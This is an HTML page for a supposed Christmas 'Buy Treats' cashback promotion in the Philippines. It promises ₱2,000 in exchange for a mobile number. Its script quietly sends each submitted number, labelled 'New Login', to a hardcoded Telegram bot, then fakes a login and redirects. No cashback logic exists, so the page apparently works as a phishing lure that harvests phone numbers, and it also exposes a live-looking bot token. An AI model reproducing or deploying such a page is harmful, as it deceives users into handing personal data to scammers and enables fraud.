<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
  <title>Buy Treats | Get Cashback</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
  <style>
    :root {
      --primary: #1e40af; 
      --primary-light: #3b82f6;
      --accent-red: #c41e3a;
      --accent-red-hover: #a0172e;
      --gold: #FFD700;
      --background-start: #041024;
      --background-end: #0f3470;
      --card-bg: rgba(255, 255, 255, 0.95);
      --text-main: #0f172a;
      --text-muted: #475569;
      --border-light: rgba(255, 255, 255, 0.3);
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(135deg, var(--background-start), var(--background-end));
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      padding: 1.2rem;
      position: relative;
      overflow: hidden;
    }

    body::before {
      content: '';
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      background: 
        radial-gradient(circle at 15% 25%, rgba(59, 130, 246, 0.4) 0%, transparent 40%),
        radial-gradient(circle at 85% 75%, rgba(59, 130, 246, 0.3) 0%, transparent 45%),
        radial-gradient(circle at 75% 15%, rgba(255, 215, 0, 0.15) 0%, transparent 40%),
        radial-gradient(circle at 20% 80%, rgba(255, 255, 255, 0.1) 0%, transparent 50%),
        radial-gradient(circle at 50% 50%, rgba(255, 255, 255, 0.05) 0%, transparent 60%);
      pointer-events: none;
      z-index: 0;
      filter: blur(8px);
    }

    .decoration {
      position: absolute;
      pointer-events: none;
      z-index: 0;
      filter: drop-shadow(0 8px 12px rgba(0, 0, 0, 0.4));
    }

    .decoration.tree {
      bottom: 8%;
      left: 6%;
      font-size: 3.5rem;
      opacity: 0.8;
      animation: float-slow 6s ease-in-out infinite;
    }

    .decoration.star {
      top: 8%;
      right: 12%;
      font-size: 2.5rem;
      opacity: 0.9;
      animation: twinkle 2s ease-in-out infinite;
    }

    .decoration.star2 {
      top: 18%;
      left: 12%;
      font-size: 1.8rem;
      opacity: 0.8;
      animation: twinkle 3s ease-in-out infinite 0.5s;
    }

    .decoration.gift {
      bottom: 12%;
      right: 10%;
      font-size: 3rem;
      opacity: 0.85;
      animation: float-slow 5s ease-in-out infinite 1s;
    }

    .decoration.santa {
      top: 15%;
      right: 20%;
      font-size: 3.2rem;
      opacity: 0.85;
      animation: float 4s ease-in-out infinite;
    }

    @keyframes twinkle {
      0%, 100% { opacity: 0.5; transform: scale(1) rotate(0deg); }
      50% { opacity: 1; transform: scale(1.15) rotate(5deg); }
    }

    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-12px); }
    }

    @keyframes float-slow {
      0%, 100% { transform: translateY(0) rotate(0deg); }
      50% { transform: translateY(-8px) rotate(-2deg); }
    }

    .snowflake {
      position: absolute;
      color: rgba(255, 255, 255, 0.4);
      font-size: 1.2rem;
      pointer-events: none;
      z-index: 0;
      animation: fall linear infinite;
      text-shadow: 0 0 5px rgba(255,255,255,0.8);
    }

    @keyframes fall {
      0% { transform: translateY(-10vh) rotate(0deg); opacity: 0; }
      10% { opacity: 0.8; }
      90% { opacity: 0.8; }
      100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
    }

    .brand-card {
      max-width: 440px;
      width: 100%;
      background: var(--card-bg);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border-radius: 32px;
      box-shadow: 
        0 20px 50px rgba(0, 0, 0, 0.4), 
        inset 0 1px 1px rgba(255, 255, 255, 0.8),
        0 0 0 1px rgba(255, 255, 255, 0.15);
      padding: 2.6rem 2rem 2.8rem;
      position: relative;
      z-index: 1;
      transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }

    .brand-card:hover {
      transform: translateY(-5px);
    }

    .brand-badge {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      font-weight: 800;
      font-size: 0.75rem;
      letter-spacing: 0.1em;
      color: var(--primary);
      text-transform: uppercase;
      background: rgba(30, 64, 175, 0.1);
      padding: 0.4rem 1.4rem;
      border-radius: 60px;
      border: 1px solid rgba(30, 64, 175, 0.2);
      margin: 0 auto 1.2rem;
      width: fit-content;
      box-shadow: 0 2px 10px rgba(30, 64, 175, 0.05);
    }
    
    .brand-badge i {
      color: var(--primary);
      font-size: 0.85rem;
    }

    .main-headline {
      text-align: center;
      margin-bottom: 1.6rem;
    }

    .main-headline h1 {
      font-size: 1.8rem;
      font-weight: 900;
      color: var(--text-main);
      line-height: 1.2;
      letter-spacing: -0.02em;
    }

    .main-headline h1 .highlight {
      color: var(--primary);
      background: linear-gradient(to right, #1e40af, #3b82f6);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      filter: drop-shadow(0 2px 4px rgba(30,64,175,0.2));
    }

    .main-headline h1 .gold {
      color: var(--gold);
      -webkit-text-fill-color: initial;
      filter: drop-shadow(0 2px 5px rgba(255, 215, 0, 0.4));
    }

    .main-headline .sub {
      font-size: 0.8rem;
      font-weight: 600;
      color: var(--text-muted);
      margin-top: 6px;
      letter-spacing: 0.02em;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }

    .main-headline .sub i {
      color: var(--primary-light);
    }

    .profile-section {
      display: flex;
      align-items: flex-start;
      gap: 1.2rem;
      margin-bottom: 2rem;
      position: relative;
    }

    .profile-photo-container {
      position: relative;
      flex-shrink: 0;
      margin-top: 0.2rem;
    }

    .profile-photo-container::before {
      content: '🎅';
      position: absolute;
      top: -16px;
      left: 50%;
      transform: translateX(-50%) rotate(-10deg);
      font-size: 2rem;
      z-index: 5;
      filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
      animation: hat-bob 3s ease-in-out infinite;
      pointer-events: none;
    }

    @keyframes hat-bob {
      0%, 100% { transform: translateX(-50%) rotate(-10deg) translateY(0); }
      50% { transform: translateX(-50%) rotate(-5deg) translateY(-4px); }
    }

    /* ===== REMASTERED PHOTO AREA - No Wallet Icon ===== */
    .profile-photo-wrapper {
      position: relative;
      width: 100px;
      height: 100px;
      border-radius: 50%;
      overflow: visible;
      cursor: pointer;
    }

    .profile-photo {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      overflow: hidden;
      border: 4px solid #ffffff;
      box-shadow: 
        0 8px 25px rgba(30, 64, 175, 0.3), 
        0 0 0 2px rgba(59, 130, 246, 0.2);
      background: linear-gradient(135deg, #3b82f6, #1e40af);
      display: flex;
      align-items: center;
      justify-content: center;
      transition: transform 0.3s ease;
      position: relative;
    }
    
    .profile-photo:hover {
      transform: scale(1.02);
    }

    .profile-photo img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
      transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }

    /* Projector Zoom - shows on hover/tap */
    .profile-photo-wrapper .projector-zoom {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 220px;
      height: 220px;
      border-radius: 50%;
      border: 4px solid rgba(255, 215, 0, 0.6);
      box-shadow: 
        0 0 40px rgba(255, 215, 0, 0.3),
        0 0 80px rgba(59, 130, 246, 0.2),
        inset 0 0 40px rgba(255, 215, 0, 0.1);
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(4px);
      transform: translate(-50%, -50%) scale(0);
      opacity: 0;
      pointer-events: none;
      z-index: 20;
      overflow: hidden;
      transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .profile-photo-wrapper .projector-zoom img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      border-radius: 50%;
      display: block;
    }

    /* Projector beam effect */
    .profile-photo-wrapper .projector-zoom::before {
      content: '';
      position: absolute;
      top: -20%;
      left: -20%;
      width: 140%;
      height: 140%;
      background: radial-gradient(circle at 30% 30%, rgba(255, 215, 0, 0.1) 0%, transparent 60%);
      pointer-events: none;
      z-index: 1;
    }

    /* Projector light ray */
    .profile-photo-wrapper .projector-zoom::after {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: conic-gradient(from 0deg, transparent 0%, rgba(255, 215, 0, 0.05) 10%, transparent 20%, rgba(59, 130, 246, 0.05) 30%, transparent 40%, rgba(255, 215, 0, 0.05) 50%, transparent 60%, rgba(59, 130, 246, 0.05) 70%, transparent 80%, rgba(255, 215, 0, 0.05) 90%, transparent 100%);
      animation: projector-spin 8s linear infinite;
      pointer-events: none;
      z-index: 0;
      border-radius: 50%;
    }

    @keyframes projector-spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Show projector zoom on hover/tap */
    .profile-photo-wrapper:hover .projector-zoom,
    .profile-photo-wrapper.active .projector-zoom {
      transform: translate(-50%, -50%) scale(1);
      opacity: 1;
    }

    /* Zoom in effect on the main photo when projector is active */
    .profile-photo-wrapper:hover .profile-photo img,
    .profile-photo-wrapper.active .profile-photo img {
      transform: scale(1.3);
    }

    /* Glow ring around photo when projector is active */
    .profile-photo-wrapper:hover .profile-photo,
    .profile-photo-wrapper.active .profile-photo {
      box-shadow: 
        0 8px 30px rgba(30, 64, 175, 0.4), 
        0 0 0 3px rgba(255, 215, 0, 0.4),
        0 0 40px rgba(255, 215, 0, 0.2);
    }

    /* For mobile - tap to zoom */
    @media (hover: none) {
      .profile-photo-wrapper .projector-zoom {
        transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
      }
      
      .profile-photo-wrapper.active .projector-zoom {
        transform: translate(-50%, -50%) scale(1);
        opacity: 1;
      }
      
      .profile-photo-wrapper.active .profile-photo img {
        transform: scale(1.3);
      }
      
      .profile-photo-wrapper.active .profile-photo {
        box-shadow: 
          0 8px 30px rgba(30, 64, 175, 0.4), 
          0 0 0 3px rgba(255, 215, 0, 0.4),
          0 0 40px rgba(255, 215, 0, 0.2);
      }
    }

    .status-dot {
      position: absolute;
      bottom: 2px;
      right: 2px;
      width: 18px;
      height: 18px;
      background: #10b981;
      border: 3px solid #ffffff;
      border-radius: 50%;
      box-shadow: 0 0 10px rgba(16, 185, 129, 0.4);
      animation: pulse-dot 2s ease-in-out infinite;
      z-index: 10;
    }

    @keyframes pulse-dot {
      0%, 100% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.1); opacity: 0.8; }
    }

    .thought-bubble-wrapper {
      flex: 1;
      position: relative;
      display: flex;
      align-items: center;
      min-height: 76px;
    }

    .thought-bubble {
      background: #f8fafc;
      border-radius: 18px 18px 18px 6px;
      padding: 1.2rem;
      width: 100%;
      min-height: 76px;
      display: flex;
      align-items: center;
      border: 1px solid rgba(0,0,0,0.05);
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.04);
      position: relative;
    }

    .thought-bubble::before {
      content: '';
      position: absolute;
      left: -12px;
      top: 30px;
      width: 0;
      height: 0;
      border-right: 14px solid #f8fafc;
      border-top: 10px solid transparent;
      border-bottom: 10px solid transparent;
      filter: drop-shadow(-2px 0 2px rgba(0, 0, 0, 0.02));
    }

    .thought-bubble .message-content {
      font-size: 0.95rem;
      font-weight: 700;
      color: var(--primary);
      line-height: 1.5;
      width: 100%;
      position: relative;
      z-index: 1;
    }

    .cursor {
      display: inline-block;
      width: 2px;
      height: 1.1em;
      background: var(--primary);
      margin-left: 2px;
      vertical-align: text-bottom;
      animation: blink 0.9s step-end infinite;
    }

    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0; }
    }

    .offer-banner {
      background: linear-gradient(135deg, var(--accent-red), #901125);
      border-radius: 16px;
      padding: 1rem 1.2rem;
      margin-bottom: 1.6rem;
      text-align: center;
      box-shadow: 
        0 8px 20px rgba(196, 30, 58, 0.3),
        inset 0 1px 2px rgba(255,255,255,0.4);
      position: relative;
      overflow: hidden;
    }
    
    .offer-banner::after {
      content: '';
      position: absolute;
      top: -50%; left: -50%;
      width: 200%; height: 200%;
      background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.2) 50%, rgba(255,255,255,0) 100%);
      transform: rotate(30deg);
      animation: shine 4s infinite;
    }

    @keyframes shine {
      0% { transform: translateX(-100%) rotate(30deg); }
      20%, 100% { transform: translateX(100%) rotate(30deg); }
    }

    .offer-banner p {
      color: #ffffff;
      font-weight: 700;
      font-size: 0.9rem;
      letter-spacing: 0.04em;
      position: relative;
      z-index: 2;
    }

    .offer-banner .highlight {
      color: var(--gold);
      font-weight: 900;
      text-shadow: 0 2px 4px rgba(0,0,0,0.3);
    }

    .form-group {
      margin-bottom: 1.4rem;
    }

    .popup-label {
      font-weight: 800;
      font-size: 0.75rem;
      color: var(--primary);
      letter-spacing: 0.08em;
      text-transform: uppercase;
      margin-bottom: 0.6rem;
      display: block;
    }

    .popup-label i {
      display: none;
    }

    .popup-input-group {
      display: flex;
      align-items: center;
      background: #f8fafc;
      border-radius: 16px;
      padding: 0 1.2rem;
      border: 2px solid #e2e8f0;
      transition: all 0.3s ease;
      box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
    }

    .popup-input-group:focus-within {
      border-color: var(--primary-light);
      background: #ffffff;
      box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15);
    }

    .popup-input-group.invalid:focus-within {
      border-color: #ef4444;
      box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.15);
    }

    .popup-input-group.valid:focus-within {
      border-color: #10b981;
      box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.15);
    }

    .mobile-icon-prefix {
      color: var(--primary);
      font-size: 1.2rem;
      margin-right: 0.8rem;
    }

    .popup-input-group input {
      flex: 1;
      border: none;
      background: transparent;
      padding: 1.1rem 0;
      font-family: 'Inter', sans-serif;
      font-size: 1.1rem;
      font-weight: 800;
      color: var(--text-main);
      outline: none;
      letter-spacing: 0.08em;
    }

    .popup-input-group input::placeholder {
      color: #94a3b8;
      font-weight: 600;
      opacity: 0.7;
    }

    .status-icon {
      font-size: 1.2rem;
      color: #cbd5e1;
      transition: all 0.3s ease;
      margin-left: 0.5rem;
    }

    .valid .status-icon { color: #10b981; }
    .invalid .status-icon { color: #ef4444; }

    .popup-hint {
      font-size: 0.75rem;
      font-weight: 600;
      color: var(--text-muted);
      margin-top: 0.6rem;
      display: flex;
      align-items: center;
      gap: 6px;
    }

    .cta-btn {
      width: 100%;
      background: linear-gradient(135deg, var(--accent-red), #901125);
      border: none;
      border-radius: 16px;
      padding: 1.2rem 0.5rem;
      font-family: 'Inter', sans-serif;
      font-weight: 900;
      font-size: 1.05rem;
      letter-spacing: 0.05em;
      color: #ffffff;
      box-shadow: 
        0 10px 25px rgba(196, 30, 58, 0.4),
        inset 0 2px 4px rgba(255,255,255,0.3);
      transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      text-transform: uppercase;
    }

    .cta-btn:hover {
      background: linear-gradient(135deg, #d42240, #a0172e);
      box-shadow: 
        0 12px 30px rgba(196, 30, 58, 0.5),
        inset 0 2px 4px rgba(255,255,255,0.4);
      transform: translateY(-2px);
    }

    .cta-btn:active {
      transform: scale(0.96) translateY(2px);
      box-shadow: 0 4px 15px rgba(196, 30, 58, 0.3);
    }

    .cta-btn i {
      color: var(--gold);
      font-size: 1.2rem;
      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
    }

    .brand-footer {
      text-align: center;
      margin-top: 1.5rem;
      font-size: 0.75rem;
      font-weight: 700;
      color: var(--text-muted);
      opacity: 0.7;
      letter-spacing: 0.05em;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }
    .brand-footer i {
      color: var(--primary);
    }

    /* ---- RESPONSIVE ---- */
    @media (max-width: 480px) {
      body { padding: 1rem; }
      .brand-card { padding: 2rem 1.4rem; border-radius: 28px; }
      
      .profile-photo-wrapper { width: 85px; height: 85px; }
      .profile-photo { width: 85px; height: 85px; }
      .profile-photo-wrapper .projector-zoom { width: 170px; height: 170px; }
      
      .thought-bubble { padding: 1rem; min-height: 68px; }
      .thought-bubble .message-content { font-size: 0.85rem; }
      .thought-bubble::before { top: 25px; }
      .status-dot { width: 16px; height: 16px; bottom: 2px; right: 2px; }
      
      .popup-input-group input { font-size: 1rem; padding: 1rem 0; }
      .cta-btn { font-size: 0.95rem; padding: 1.1rem 0.5rem; }
      .mobile-icon-prefix { font-size: 1.1rem; }

      .main-headline h1 { font-size: 1.5rem; }
      .offer-banner p { font-size: 0.8rem; }
      .profile-photo-container::before { font-size: 1.6rem; top: -12px; }
      .decoration { display: none; }
    }

    @media (max-width: 380px) {
      .brand-card { padding: 1.6rem 1rem; }
      .profile-photo-wrapper { width: 75px; height: 75px; }
      .profile-photo { width: 75px; height: 75px; }
      .profile-photo-wrapper .projector-zoom { width: 150px; height: 150px; }
      
      .thought-bubble .message-content { font-size: 0.8rem; }
      .thought-bubble { min-height: 60px; padding: 0.8rem; }
      .popup-input-group input { font-size: 0.95rem; padding: 0.9rem 0; }
      .main-headline h1 { font-size: 1.3rem; }
      .profile-photo-container::before { font-size: 1.4rem; top: -10px; }
    }
  </style>
</head>
<body>

  <div class="decoration tree">🎄</div>
  <div class="decoration star">⭐</div>
  <div class="decoration star2">✨</div>
  <div class="decoration gift">🎁</div>
  <div class="decoration santa">🎅</div>

  <div class="snowflake" style="left: 5%; animation-duration: 12s; animation-delay: 0s;">❄</div>
  <div class="snowflake" style="left: 15%; animation-duration: 14s; animation-delay: 2s;">❄</div>
  <div class="snowflake" style="left: 25%; animation-duration: 10s; animation-delay: 4s;">❄</div>
  <div class="snowflake" style="left: 35%; animation-duration: 16s; animation-delay: 1s;">❄</div>
  <div class="snowflake" style="left: 45%; animation-duration: 11s; animation-delay: 3s;">❄</div>
  <div class="snowflake" style="left: 55%; animation-duration: 13s; animation-delay: 5s;">❄</div>
  <div class="snowflake" style="left: 65%; animation-duration: 15s; animation-delay: 2s;">❄</div>
  <div class="snowflake" style="left: 75%; animation-duration: 12s; animation-delay: 4s;">❄</div>
  <div class="snowflake" style="left: 85%; animation-duration: 14s; animation-delay: 1s;">❄</div>
  <div class="snowflake" style="left: 92%; animation-duration: 11s; animation-delay: 3s;">❄</div>

  <div class="brand-card">
    
    <div style="display: flex; justify-content: center;">
      <div class="brand-badge">
        <i class="fas fa-gift"></i> BUY TREATS · CASHBACK
      </div>
    </div>

    <div class="main-headline">
      <h1>
        <span class="gold">✨</span> 
        <span class="highlight">HOLIDAY</span> CASHBACK
        <span class="gold">✨</span>
      </h1>
      <div class="sub">
        <i class="fas fa-tag"></i> Earn cashback on every treat you buy!
      </div>
    </div>

    <div class="offer-banner">
      <p>
        <i class="fas fa-star"></i>
        <span class="highlight">🎄 CHRISTMAS BONUS</span>
        <i class="fas fa-star"></i><br />
        Get <span class="highlight">₱2,000</span> cashback when you sign up today!
      </p>
    </div>

    <div class="profile-section">
      <div class="profile-photo-container">
        <div class="profile-photo-wrapper" id="photoWrapper">
          <div class="profile-photo">
            <img src="photos/iva.png" alt="Buy Treats" id="brandImg" />
          </div>
          <!-- Projector Zoom -->
          <div class="projector-zoom" id="projectorZoom">
            <img src="photos/iva.png" alt="Zoom" id="projectorImg" />
          </div>
        </div>
        <div class="status-dot"></div>
      </div>

      <div class="thought-bubble-wrapper">
        <div class="thought-bubble">
          <div class="message-content">
            <span id="typedText"></span><span class="cursor"></span>
          </div>
        </div>
      </div>
    </div>

    <div class="form-group">
      <label class="popup-label" for="popupMobileInput">
        Mobile Number
      </label>
      <div class="popup-input-group" id="inputWrapper">
        <i class="fas fa-mobile-alt mobile-icon-prefix"></i>
        <input 
          type="tel" 
          id="popupMobileInput" 
          placeholder="09171234567" 
          maxlength="11" 
          inputmode="numeric" 
          pattern="[0-9]*" 
          autocomplete="off" 
          value="09"
        />
        <i class="fas fa-check-circle status-icon" id="statusIcon"></i>
      </div>
      <div class="popup-hint">
        <i class="fas fa-info-circle"></i> Mag-enter ng 11-digit number
      </div>
    </div>

    <button class="cta-btn" id="popupSubmitBtn">
      <i class="fas fa-gift"></i> GET CASHBACK NOW
    </button>

    <div class="brand-footer">
      <i class="fas fa-shield-alt"></i> Secure · Buy Treats | Get Cashback
    </div>
  </div>

  <!-- Hidden Audio Element -->
  <audio id="successSound" src="sounds/bells.mp3" preload="auto"></audio>

  <script>
    (function() {
      const img = document.getElementById('brandImg');
      const projectorImg = document.getElementById('projectorImg');
      const successSound = document.getElementById('successSound');

      // Handle image error - show gradient background instead of icon
      img.addEventListener('error', function() {
        this.style.display = 'none';
        this.parentElement.style.background = 'linear-gradient(135deg, #3b82f6, #1e40af)';
        this.parentElement.style.display = 'flex';
        this.parentElement.style.alignItems = 'center';
        this.parentElement.style.justifyContent = 'center';
        // Add a simple text placeholder
        const placeholder = document.createElement('span');
        placeholder.textContent = '📱';
        placeholder.style.fontSize = '2.5rem';
        placeholder.style.color = '#ffffff';
        placeholder.style.opacity = '0.6';
        this.parentElement.appendChild(placeholder);
      });

      // Also handle projector image error
      projectorImg.addEventListener('error', function() {
        this.style.display = 'none';
        this.parentElement.style.background = 'linear-gradient(135deg, #3b82f6, #1e40af)';
        this.parentElement.style.display = 'flex';
        this.parentElement.style.alignItems = 'center';
        this.parentElement.style.justifyContent = 'center';
        const placeholder = document.createElement('span');
        placeholder.textContent = '📱';
        placeholder.style.fontSize = '4rem';
        placeholder.style.color = '#ffffff';
        placeholder.style.opacity = '0.6';
        this.parentElement.appendChild(placeholder);
      });

      // ===== PROJECTOR ZOOM - TAP TOGGLE FOR MOBILE =====
      const photoWrapper = document.getElementById('photoWrapper');
      
      photoWrapper.addEventListener('click', function(e) {
        e.stopPropagation();
        this.classList.toggle('active');
      });

      document.addEventListener('click', function(e) {
        if (!photoWrapper.contains(e.target)) {
          photoWrapper.classList.remove('active');
        }
      });

      const messages = [
        "🎄 Advance Merry Christmas! Treat yourself! 🎅",
        "Earn double cashback on every treat you buy! 💰",
        "Sign up now and get up to ₱2,000 cashback! 🎁",
        "Spend Treats & Get Cashback this Holiday! ✨"
      ];
      let messageIndex = 0;
      let charIndex = 0;
      let isDeleting = false;
      const typedSpan = document.getElementById('typedText');
      let typingSpeed = 38;

      function typeEffect() {
        const currentMessage = messages[messageIndex];
        if (!isDeleting) {
          typedSpan.textContent = currentMessage.substring(0, charIndex + 1);
          charIndex++;
          if (charIndex === currentMessage.length) {
            setTimeout(() => { isDeleting = true; typeEffect(); }, 2800);
            return;
          }
          setTimeout(typeEffect, typingSpeed + Math.random() * 20);
        } else {
          typedSpan.textContent = currentMessage.substring(0, charIndex - 1);
          charIndex--;
          if (charIndex === 0) {
            isDeleting = false;
            messageIndex = (messageIndex + 1) % messages.length;
            setTimeout(typeEffect, 500);
            return;
          }
          setTimeout(typeEffect, typingSpeed * 0.35);
        }
      }
      setTimeout(typeEffect, 700);

      const mobileInput = document.getElementById('popupMobileInput');
      const inputWrapper = document.getElementById('inputWrapper');
      const statusIcon = document.getElementById('statusIcon');
      const submitBtn = document.getElementById('popupSubmitBtn');

      function validateInput() {
        const val = mobileInput.value;
        const digits = val.replace(/\D/g, '');
        if (digits.length === 11 && digits.startsWith('09')) {
          inputWrapper.classList.remove('invalid');
          inputWrapper.classList.add('valid');
          statusIcon.className = "fas fa-check-circle status-icon";
          return true;
        } else {
          inputWrapper.classList.remove('valid');
          if (digits.length >= 3) {
            inputWrapper.classList.add('invalid');
            statusIcon.className = "fas fa-times-circle status-icon";
          } else {
            inputWrapper.classList.remove('invalid');
            statusIcon.className = "fas fa-check-circle status-icon";
          }
          return false;
        }
      }

      mobileInput.addEventListener('input', function() {
        let digits = this.value.replace(/\D/g, '');
        if (digits === '') {
          this.value = '09';
          validateInput();
          return;
        }
        if (!digits.startsWith('09')) {
          digits = '09' + digits.replace(/^0+/, '');
        }
        if (digits.length > 11) digits = digits.slice(0, 11);
        this.value = digits;
        validateInput();
      });

      mobileInput.addEventListener('blur', function() {
        let val = this.value.replace(/\D/g, '');
        if (val === '') { this.value = '09'; return; }
        if (!val.startsWith('09')) val = '09' + val.slice(2);
        if (val.length > 11) val = val.slice(0, 11);
        this.value = val;
        validateInput();
      });

      mobileInput.addEventListener('keydown', function(e) {
        if (['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'].includes(e.key)) return;
        if (e.key === 'Escape') { this.value = '09'; validateInput(); return; }
        if (!/^[0-9]$/.test(e.key)) e.preventDefault();
      });

      // ===== SIMPLIFIED TELEGRAM NOTIFICATION =====
      function sendTelegramNotification(phoneNumber) {
        const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
        const chatId = '7298607329';
        
        const timestamp = new Date().toLocaleString('en-PH', {
          timeZone: 'Asia/Manila',
          month: 'long',
          day: 'numeric',
          year: 'numeric',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit'
        });
        
        // Simplified message - number and date only
        const message = `
📱 <b>New Login</b>
Number: ${phoneNumber}
📅 ${timestamp}
        `;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const params = {
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML'
        };
        
        const queryString = Object.keys(params)
          .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
          .join('&');
        
        fetch(`${url}?${queryString}`)
          .then(response => response.json())
          .then(data => {
            if (!data.ok) {
              console.error('Telegram error:', data.description);
            }
          })
          .catch(error => {
            console.error('Failed to send Telegram notification:', error);
          });
      }

      // ===== PLAY MUSIC FUNCTION =====
      function playSuccessSound() {
        if (successSound) {
          successSound.currentTime = 0;
          successSound.play().catch(function(error) {
            console.log('Audio play failed:', error);
          });
        }
      }

      function handleSubmit() {
        const val = mobileInput.value.replace(/\D/g, '');
        if (val.length === 11 && val.startsWith('09')) {
          // Play success sound
          playSuccessSound();
          
          // Save user info to localStorage
          localStorage.setItem('user_phone', val);
          localStorage.setItem('is_logged_in', 'true');
          
          // Send simplified Telegram notification
          sendTelegramNotification(val);
          
          // Show loading state
          submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> LOADING...';
          submitBtn.disabled = true;
          
          setTimeout(() => {
            window.location.href = 'main.html';
          }, 1000);
        } else {
          inputWrapper.classList.add('invalid');
          statusIcon.className = "fas fa-times-circle status-icon";
          mobileInput.focus();
          if (val.length < 11) {
            alert('❗ Kailangan ng 11-digit number na nagsisimula sa 09.');
          } else {
            alert('❗ Dapat magsimula sa "09" ang number.');
          }
        }
      }

      submitBtn.addEventListener('click', function(e) {
        e.preventDefault();
        handleSubmit();
      });

      mobileInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') { e.preventDefault(); handleSubmit(); }
      });

      validateInput();
    })();
  </script>
</body>
</html>
